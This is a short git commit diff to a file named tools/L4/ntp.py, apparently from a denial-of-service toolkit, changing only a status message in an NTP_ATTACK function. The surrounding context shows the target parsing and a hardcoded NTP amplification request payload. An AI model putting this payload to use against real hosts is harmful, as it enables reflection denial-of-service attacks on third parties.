925aa3d82f9f0f4fc8468cd15158d062f775c94b
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-02-12 23:08:39 +0300

    Update ntp.py

--- tools/L4/ntp.py
+++ tools/L4/ntp.py
@@ -35,7 +35,7 @@ def NTP_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting attack...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting NTP attack...")
 	
 	# Payload
 	payload = ("\x17\x00\x03\x2a" + "\x00" * 4)
